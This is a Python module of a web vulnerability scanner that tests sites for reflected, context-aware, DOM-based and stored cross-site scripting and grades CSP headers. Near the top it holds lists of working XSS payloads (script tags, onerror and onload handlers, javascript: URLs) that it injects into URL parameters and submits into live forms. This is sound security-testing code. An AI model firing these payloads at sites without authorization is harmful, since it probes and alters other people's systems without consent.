# xss_part.py — Advanced XSS engine (refactored & extended)
# Features:
# - Context-aware payloads (html / attr / js / url)
# - DOM XSS (sources + sinks + lightweight taint hints + FP reduction)
# - Advanced reflected XSS (decode/unescape reflection + confidence scoring + payload mutation)
# - Smarter auto-verify (token-based, decode-aware)
# - Stored XSS (submit + check view pages) + guess_view_pages()
# Notes:
# - Designed to integrate with scanner.py (expects: XSS_PAYLOADS, run_context_aware_xss_phase,
#   run_advanced_reflected_xss_phase, run_dom_xss_phase, auto_verify_xss, analyze_csp,
#   classify_xss_exploitability, analyze_x_xss_protection, run_stored_xss_phase, guess_view_pages)

import re
import time
import html as _html
import uuid
import urllib.parse as urllib_parse
from urllib.parse import urlparse, urlencode, urlunparse, urljoin
from copy import deepcopy
from bs4 import BeautifulSoup
import requests

# =========================================================
# Payloads
# =========================================================

# Base reflected payloads (kept for compatibility)
XSS_PAYLOADS = [
    "<script>alert(1)</script>",
    "\"><script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "';alert(1);//",
    "\";alert(1);//",
    "</script><script>alert(1)</script>",
    "\" autofocus onfocus=alert(1) x=\""
]

# Context-aware payloads
CTX_XSS_PAYLOADS = {
    "html": [
        "<script>alert(1)</script>",
        "<img src=x onerror=alert(1)>",
        "<svg onload=alert(1)>",
    ],
    "attr": [
        "\" onmouseover=alert(1) x=\"",
        "' onfocus=alert(1) x='",
        "\" autofocus onfocus=alert(1) x=\"",
    ],
    "js": [
        "';alert(1);//",
        "\";alert(1);//",
        "</script><script>alert(1)</script>",
    ],
    "url": [
        "javascript:alert(1)",
        "data:text/html,<script>alert(1)</script>",
        "javascript%3Aalert%281%29",
    ],
}

# Advanced / smart payloads
XSS_SMART_PAYLOADS = [
    "<svg onload=alert(1)>",
    "<img src=x onerror=alert(1)>",
    "<body onload=alert(1)>",
    "<iframe srcdoc='<script>alert(1)</script>'>",
    "javascript:alert(1)",
]

# Key indicators (used carefully to avoid FP)
XSS_KEY_PARTS = [
    "<script", "onerror", "onload", "javascript:",
    "srcdoc", "<iframe", "<svg"
]

HTML_ENCODE_MARKERS = ["&lt;", "&gt;", "&quot;", "&#", "&amp;"]

# =========================================================
# Small utilities
# =========================================================

def _safe_unescape(s: str) -> str:
    try:
        return _html.unescape(s or "")
    except Exception:
        return s or ""

def _safe_urldecode(s: str) -> str:
    try:
        return urllib_parse.unquote_plus(s or "")
    except Exception:
        return s or ""

def _norm_text(s: str) -> str:
    return (s or "").replace("\x00", "")

def _contains_marker_decode_aware(body: str, marker: str) -> bool:
    """
    Checks marker presence with decode/unescape variants to reduce false negatives:
    - raw body
    - html.unescape(body)
    - urldecode(body)
    - html.unescape(urldecode(body)) etc
    """
    if not body or not marker:
        return False

    body_raw = body
    body_unesc = _safe_unescape(body_raw)
    body_ud = _safe_urldecode(body_raw)
    body_ud_unesc = _safe_unescape(body_ud)

    # also check marker decoded variants
    m_raw = marker
    m_unesc = _safe_unescape(marker)
    m_ud = _safe_urldecode(marker)
    m_ud_unesc = _safe_unescape(m_ud)

    candidates_body = [body_raw, body_unesc, body_ud, body_ud_unesc]
    candidates_m = [m_raw, m_unesc, m_ud, m_ud_unesc]

    for b in candidates_body:
        for m in candidates_m:
            if m and m in b:
                return True
    return False

def _looks_fully_encoded(body: str) -> bool:
    """
    Very rough heuristic: if the page contains common encode markers and
    DOES NOT contain '<' or '>' at all, it might be heavily encoded.
    We use it only to reduce obvious FPs, not as a strict blocker.
    """
    if not body:
        return False
    b = body
    if ("<" not in b and ">" not in b) and any(m in b for m in HTML_ENCODE_MARKERS):
        return True
    return False

# =========================================================
# Phase 12: CSP & Security Headers
# =========================================================

def _split_csp_directives(csp: str) -> dict:
    out = {}
    if not csp:
        return out
    for part in [p.strip() for p in csp.split(";") if p.strip()]:
        tokens = part.split()
        if not tokens:
            continue
        out[tokens[0].lower()] = [t.lower() for t in tokens[1:]]
    return out

def analyze_csp(headers: dict) -> dict:
    csp = (headers.get("Content-Security-Policy")
           or headers.get("content-security-policy")
           or "").strip()
    if not csp:
        return {"present": False, "level": "none", "reason": "No CSP", "raw": ""}

    d = _split_csp_directives(csp)
    script_policy = d.get("script-src") or d.get("default-src") or []
    sp = " ".join(script_policy)

    unsafe_inline = "'unsafe-inline'" in sp
    unsafe_eval = "'unsafe-eval'" in sp
    wildcard = "*" in script_policy
    nonce_or_hash = any(v.startswith("'nonce-") or v.startswith("'sha") for v in script_policy)

    if unsafe_inline or unsafe_eval or wildcard:
        return {
            "present": True,
            "level": "weak",
            "reason": "CSP allows inline/eval/wildcard",
            "raw": csp
        }

    if nonce_or_hash:
        return {
            "present": True,
            "level": "strong",
            "reason": "Nonce/hash required for scripts",
            "raw": csp
        }

    return {
        "present": True,
        "level": "strong",
        "reason": "Inline scripts blocked",
        "raw": csp
    }

def analyze_x_xss_protection(headers: dict) -> dict:
    v = (headers.get("X-XSS-Protection") or "").strip()
    if not v:
        return {"present": False, "value": "", "status": "missing"}
    if v.startswith("0"):
        return {"present": True, "value": v, "status": "disabled"}
    if v.startswith("1"):
        return {"present": True, "value": v, "status": "enabled"}
    return {"present": True, "value": v, "status": "unknown"}

def classify_xss_exploitability(csp_info: dict) -> str:
    """
    Correct logic:
    - If NO CSP -> usually exploitable (client-side defenses absent)
    - If CSP weak -> exploitable
    - If CSP strong -> vulnerable but mitigated (may still bypass, but we label conservatively)
    """
    if not csp_info or not csp_info.get("present"):
        return "VULNERABLE_AND_EXPLOITABLE"
    if csp_info.get("level") == "strong":
        return "VULNERABLE_BUT_CSP_MITIGATES"
    return "VULNERABLE_AND_EXPLOITABLE"

def enrich_finding_with_headers(finding: dict, resp):
    if not finding or not resp:
        return finding

    csp = analyze_csp(resp.headers or {})
    xxp = analyze_x_xss_protection(resp.headers or {})
    finding.setdefault("extra", {}).update({
        "csp_present": csp.get("present"),
        "csp_level": csp.get("level"),
        "csp_reason": csp.get("reason"),
        "csp_raw": csp.get("raw"),
        "x_xss_protection_present": xxp.get("present"),
        "x_xss_protection_value": xxp.get("value"),
        "x_xss_protection_status": xxp.get("status"),
    })
    finding["exploit_status"] = classify_xss_exploitability(csp)
    return finding

# =========================================================
# Auto-verify XSS (decode-aware)
# =========================================================

def auto_verify_xss(method, url, param_name, original_params, post_data, headers,
                    request_with_timeout, json_body=None, json_key=None):
    """
    Token-based verification:
    - inject payload with unique token
    - check token is reflected (decode/unescape aware)
    - reduce FP by requiring token appear (not just generic keywords)
    """
    token = f"XSSV_{uuid.uuid4().hex[:10]}"
    payload = f"<script>console.log('{token}')</script>"

    r = None

    if json_body is not None and json_key is not None:
        jb = deepcopy(json_body)
        jb[json_key] = payload
        r = request_with_timeout(method, url, headers=headers, json_body=jb)
    else:
        parsed = urlparse(url)
        params = deepcopy(original_params) if original_params else {}
        key = param_name or "_xsstest"
        params[key] = [payload]
        q = urlencode({k: v[0] for k, v in params.items()}, doseq=False)
        test_url = urlunparse(parsed._replace(query=q))
        r = request_with_timeout(method, test_url, headers=headers, data=post_data)

    if not r or not r.text:
        return False

    body = _norm_text(r.text)

    # if page looks like it escapes everything AND token isn't found even after unescape -> not verified
    if _looks_fully_encoded(body) and not _contains_marker_decode_aware(body, token):
        return False

    # verified if token appears (raw/decoded/unescaped)
    return _contains_marker_decode_aware(body, token)

# =========================================================
# Phase 8: Context-aware reflected XSS
# =========================================================

def detect_xss_context(html_text: str, marker: str):
    if not html_text or marker not in html_text:
        return None

    idx = html_text.find(marker)

    # inside <script> ... (very rough)
    if "<script" in html_text[:idx].lower() and "</script>" not in html_text[:idx].lower():
        return "js"

    window = html_text[max(0, idx - 200):idx + 200]

    # URL context in href/src/action
    if re.search(r"\b(href|src|action)\s*=\s*['\"]?[^'\">]*" + re.escape(marker), window, re.I):
        return "url"

    # attribute context
    if re.search(r"\b[\w:-]+\s*=\s*(['\"]).*?" + re.escape(marker), window, re.I):
        return "attr"

    return "html"

def run_context_aware_xss_phase(method, url, params, headers, json_body, post_data,
                                base_status, base_text, verbose, fingerprint,
                                request_with_timeout, _single_injection_attempt, log=print):
    """
    Strategy:
    - For each param: inject unique marker to learn context
    - If marker reflects -> pick payloads for that context
    - Use scanner's _single_injection_attempt for unified reporting (and Phase 12 enrichment)
    """
    findings = []
    if method.upper() != "GET" or not params or json_body:
        return findings

    parsed = urlparse(url)

    for pname in params:
        marker = f"CTX_{pname}_{uuid.uuid4().hex[:8]}"
        test_params = deepcopy(params)
        test_params[pname] = [marker]
        q = urlencode({k: v[0] for k, v in test_params.items()}, doseq=False)
        murl = urlunparse(parsed._replace(query=q))

        r = request_with_timeout("GET", murl, headers=headers)
        if not r or not r.text:
            continue

        # must reflect marker (decode-aware)
        if not _contains_marker_decode_aware(r.text, marker):
            continue

        ctx = detect_xss_context(r.text, marker) or "html"
        if verbose:
            log(f"[CTX-XSS] {url} param={pname} ctx={ctx}")

        for payload in CTX_XSS_PAYLOADS.get(ctx, []):
            f = _single_injection_attempt(
                method="GET",
                url=url,
                param_name=pname,
                original_params=params,
                base_text=base_text,
                base_status=base_status,
                payload=payload,
                post_data=post_data,
                headers=headers,
                verbose=verbose,
                fingerprint=fingerprint
            )
            if f:
                f.setdefault("extra", {})["xss_context"] = ctx
                # r is marker-response; better enrich with test payload response in scanner,
                # but keeping CSP info from r is still useful
                f = enrich_finding_with_headers(f, r)
                findings.append(f)

    return findings

# =========================================================
# Phase 9: Advanced reflected XSS (confidence-based + decode-aware reflection)
# =========================================================

def _payload_reflected_decode_aware(body: str, payload: str) -> bool:
    """
    Checks if payload is reflected either raw or after html.unescape/urldecode.
    """
    if not body or not payload:
        return False
    return _contains_marker_decode_aware(body, payload)

def _is_encoded_reflection(body: str, payload: str) -> bool:
    """
    If raw payload is not present but html-escaped version is present,
    treat it as encoded (mitigated) to reduce FP.
    """
    if not body or not payload:
        return False

    raw_present = payload in (body or "")
    if raw_present:
        return False

    esc = _html.escape(payload, quote=True)
    # also allow common partial escapes
    return esc in body or (_safe_unescape(body) and payload in _safe_unescape(body) and raw_present is False)

def run_advanced_reflected_xss_phase(method, url, params, headers, base_text_raw,
                                     fingerprint, request_with_timeout,
                                     compute_score, log, now_ts, verbose=False):
    """
    Strategy:
    - Try smart payloads
    - Accept only if payload reflected decode-aware
    - Reject if reflection appears encoded-only
    """
    findings = []
    if not params:
        return findings

    parsed = urlparse(url)

    for pname in params:
        for payload in XSS_SMART_PAYLOADS:
            tp = deepcopy(params)
            tp[pname] = [payload]
            q = urlencode({k: v[0] for k, v in tp.items()}, doseq=False)
            test_url = urlunparse(parsed._replace(query=q))

            r = request_with_timeout(method, test_url, headers=headers)
            if not r or not r.text:
                continue

            body = _norm_text(r.text)

            # reflection must exist decode-aware
            if not _payload_reflected_decode_aware(body, payload):
                continue

            # if it's only encoded reflection -> skip (reduce FP)
            if _is_encoded_reflection(body, payload):
                continue

            verify = {
                "verified": True,
                "evidence": "Reflected payload (decode-aware) without encoding-only pattern",
                "score_delta": 40,
                "elapsed": 0.0
            }

            score = compute_score(
                base_confidence=45,
                fingerprint=fingerprint,
                verify_result=verify,
                payload=payload
            ) if compute_score else 60

            finding = {
                "timestamp": now_ts(),
                "url": url,
                "test_url": test_url,
                "method": method,
                "injected_param": pname,
                "payload": payload,
                "vuln_type": "XSS",                 # keep consistent with scanner
                "report_type": "Reflected XSS",
                "xss_subtype": "reflected",
                "category": "XSS",
                "reason": verify["evidence"],
                "status_code": r.status_code,
                "auto_verified": True,
                "verify": verify,
                "fingerprint": fingerprint or {},
                "score": score,
                "status": "confirmed" if score >= 50 else "probable",
            }

            finding = enrich_finding_with_headers(finding, r)
            if verbose:
                log(f"[XSS-ADV] {url} param={pname} payload={payload}")

            findings.append(finding)
            break

    return findings

# =========================================================
# Phase 10: DOM XSS (static + lightweight taint hints + FP reduction)
# =========================================================

DOM_XSS_SOURCES = [
    r"location\.(hash|search|href)",
    r"document\.(URL|documentURI|referrer)",
    r"localStorage",
    r"sessionStorage",
    r"window\.name"
]

DOM_XSS_SINKS = [
    r"\.innerHTML\s*=",
    r"\.outerHTML\s*=",
    r"document\.write\s*\(",
    r"insertAdjacentHTML\s*\(",
    r"\beval\s*\(",
    r"\bFunction\s*\(",
    r"setTimeout\s*\(",
    r"setInterval\s*\("
]

SRC_RE = [re.compile(p, re.I) for p in DOM_XSS_SOURCES]
SINK_RE = [re.compile(p, re.I) for p in DOM_XSS_SINKS]

_ASSIGN_RE = re.compile(r"\b(var|let|const)\s+([A-Za-z_$][\w$]*)\s*=\s*(.+?);", re.I)
_SIMPLE_ASSIGN_RE = re.compile(r"\b([A-Za-z_$][\w$]*)\s*=\s*(.+?);", re.I)

def _extract_taint_vars(lines):
    """
    Collect variables that are assigned from sources:
      const x = location.hash;
      y = document.URL;
    """
    tainted = set()
    for line in lines:
        ln = line.strip()
        if not ln or ln.startswith("//"):
            continue

        m = _ASSIGN_RE.search(ln) or _SIMPLE_ASSIGN_RE.search(ln)
        if not m:
            continue

        varname = m.group(2) if m.re is _ASSIGN_RE else m.group(1)
        expr = m.group(3) if m.re is _ASSIGN_RE else m.group(2)

        if any(r.search(expr) for r in SRC_RE):
            tainted.add(varname)
    return tainted

def _sink_uses_tainted(line: str, tainted_vars: set) -> bool:
    if not tainted_vars:
        return False
    for v in tainted_vars:
        # must appear as a token, not as substring of another word
        if re.search(rf"\b{re.escape(v)}\b", line):
            return True
    return False

def run_dom_xss_phase(url, base_html, TIMEOUT, headers=None, fingerprint=None,
                      compute_score=None, log=print, now_ts=None,
                      verbose=False, session=None):
    findings = []
    if not base_html:
        return findings

    soup = BeautifulSoup(base_html, "html.parser")
    scripts = []

    # inline scripts
    for i, s in enumerate(soup.find_all("script"), 1):
        if s.string and s.string.strip():
            scripts.append(("inline", f"inline#{i}", s.string))

    # external scripts
    sess = session or requests
    for s in soup.find_all("script", src=True):
        try:
            src_url = urljoin(url, s.get("src"))
            r = sess.get(src_url, headers=headers, timeout=TIMEOUT, allow_redirects=True)
            if r and r.text:
                scripts.append(("external", src_url, r.text))
        except Exception:
            pass

    # analyze each script with lightweight taint flow:
    #   - collect tainted vars from source assignments
    #   - flag sinks only if using tainted var (reduces FP)
    for kind, sid, code in scripts:
        lines = code.splitlines()
        tainted = _extract_taint_vars(lines)

        for ln, line in enumerate(lines, 1):
            sline = line.strip()
            if not sline or sline.startswith("//"):
                continue

            sinks = [r.pattern for r in SINK_RE if r.search(sline)]
            if not sinks:
                continue

            # FP reduction: require either:
            # 1) same line contains a source AND sink, or
            # 2) sink line uses tainted variable assigned from sources elsewhere
            srcs_inline = [r.pattern for r in SRC_RE if r.search(sline)]
            flow_ok = bool(srcs_inline) or _sink_uses_tainted(sline, tainted)

            if not flow_ok:
                continue

            score = 35
            if compute_score:
                score = compute_score(
                    base_confidence=35,
                    fingerprint=fingerprint,
                    verify_result={"verified": False, "score_delta": 0},
                    payload=None
                )

            reason = "DOM flow (taint) from source to sink"
            extra = {
                "script_type": kind,
                "script_id": sid,
                "line_no": ln,
                "sources_inline": srcs_inline,
                "sinks": sinks,
                "tainted_vars": sorted(list(tainted))[:30],
            }
            if srcs_inline:
                reason = f"Source {srcs_inline} and sink {sinks} on same line {ln}"
            else:
                reason = f"Sink {sinks} uses tainted variable at line {ln}"

            findings.append({
                "timestamp": now_ts() if now_ts else "",
                "url": url,
                "test_url": url,
                "method": "GET",
                "injected_param": "[DOM_ANALYSIS]",
                "payload": "[DOM_ANALYSIS]",
                "vuln_type": "XSS",
                "report_type": "DOM XSS",
                "xss_subtype": "dom",
                "category": "XSS",
                "reason": reason,
                "auto_verified": False,
                "verify": {"verified": False},
                "fingerprint": fingerprint or {},
                "score": score,
                "status": "probable",
                "extra": extra
            })

            if verbose:
                log(f"[DOM-XSS] {url} script={sid} line={ln}")

    return findings

# =========================================================
# Phase 11: Stored XSS (submit + check view pages)
# =========================================================

def guess_view_pages(discovered_urls, input_page_url):
    """
    Heuristic to choose candidate 'view pages' where stored content may appear.
    Works with what scanner.py passes (discovered_urls list).
    """
    if not discovered_urls:
        return [input_page_url]

    input_base = urlparse(input_page_url)
    same_origin = []
    for u in discovered_urls:
        try:
            pu = urlparse(u)
            if pu.scheme == input_base.scheme and pu.netloc == input_base.netloc:
                same_origin.append(u)
        except Exception:
            continue

    # prioritize typical pages where comments/reviews/messages show up
    keywords = ["profile", "comment", "reviews", "review", "messages", "message", "feed", "posts", "post", "wall", "admin"]
    ranked = sorted(
        same_origin,
        key=lambda x: 0 if any(k in x.lower() for k in keywords) else 1
    )

    # also include input page itself early
    out = []
    if input_page_url not in out:
        out.append(input_page_url)
    for u in ranked:
        if u not in out:
            out.append(u)

    return out[:40]

def _extract_forms(html_text: str, base_url: str):
    soup = BeautifulSoup(html_text or "", "html.parser")
    forms = []
    for f in soup.find_all("form"):
        action = f.get("action") or ""
        method = (f.get("method") or "GET").upper()
        target = urljoin(base_url, action) if action else base_url

        fields = []
        for inp in f.find_all(["input", "textarea"]):
            name = inp.get("name")
            if not name:
                continue
            itype = (inp.get("type") or "").lower()
            if itype in ("submit", "button", "image", "file"):
                continue
            fields.append(name)

        # include selects too
        for sel in f.find_all("select"):
            name = sel.get("name")
            if name:
                fields.append(name)

        fields = list(dict.fromkeys(fields))  # unique keep order
        if fields:
            forms.append({"action": target, "method": method, "fields": fields})
    return forms

def _stored_payload(token: str) -> str:
    # marker that survives common rendering
    return f"STORED_XSS_{token}"

def run_stored_xss_phase(session, input_page_url, input_html, candidate_view_urls,
                         wait_sec=2.0, log=print, verbose=False, now_ts=None):
    """
    Stored XSS approach (safe, scanner-friendly):
    - Parse forms from input page
    - Submit a unique marker into text fields
    - Wait a bit
    - Visit candidate view pages and search for marker (decode-aware)
    Returns findings list (dicts) consumed by scanner.py.
    """
    findings = []
    if not session or not input_page_url or not input_html:
        return findings

    forms = _extract_forms(input_html, input_page_url)
    if not forms:
        if verbose:
            log(f"[STORED-XSS] No forms found on: {input_page_url}")
        return findings

    # pick candidates
    view_urls = candidate_view_urls or [input_page_url]
    view_urls = list(dict.fromkeys(view_urls))  # unique

    for form in forms:
        token = uuid.uuid4().hex[:10]
        marker = _stored_payload(token)

        data = {}
        for fn in form["fields"]:
            # keep minimal noise: only place marker in the first few fields
            data[fn] = marker

        # submit
        try:
            if form["method"] == "POST":
                resp = session.post(form["action"], data=data, timeout=10, allow_redirects=True)
            else:
                # GET submit
                q = urlencode({k: v for k, v in data.items()}, doseq=False)
                test_url = form["action"] + ("&" if "?" in form["action"] else "?") + q
                resp = session.get(test_url, timeout=10, allow_redirects=True)
        except Exception as e:
            if verbose:
                log(f"[STORED-XSS] submit failed: {e}")
            continue

        if verbose:
            log(f"[STORED-XSS] submitted marker to {form['action']} fields={form['fields']} status={getattr(resp,'status_code',None)}")

        # wait for storage
        try:
            time.sleep(max(0.0, float(wait_sec or 0.0)))
        except Exception:
            pass

        # check view pages
        found_on = None
        for vu in view_urls:
            try:
                vr = session.get(vu, timeout=10, allow_redirects=True)
                if not vr or not vr.text:
                    continue
                if _contains_marker_decode_aware(vr.text, marker):
                    found_on = vu
                    # NOTE: stored XSS might still be encoded; we report marker presence,
                    # and scanner/report can treat it as confirmed stored injection.
                    break
            except Exception:
                continue

        if found_on:
            f = {
                "timestamp": now_ts() if now_ts else "",
                "input_url": input_page_url,
                "view_url": found_on,
                "input_fields": form["fields"],
                "payload": marker,
                "vuln_type": "XSS",
                "report_type": "Stored XSS",
                "xss_subtype": "stored",
                "category": "XSS",
                "phase": "stored",
                "reason": f"Stored marker found on view page: {found_on}",
                "auto_verified": True,
                "verify": {"verified": True, "evidence": "stored marker found", "score_delta": 50, "elapsed": 0.0},
                "score": 80,
                "status": "confirmed",
                "extra": {
                    "stored_marker": marker,
                    "submit_action": form["action"],
                    "submit_method": form["method"]
                }
            }
            findings.append(f)
        else:
            if verbose:
                log(f"[STORED-XSS] marker not found after submit (token={token})")

    return findings

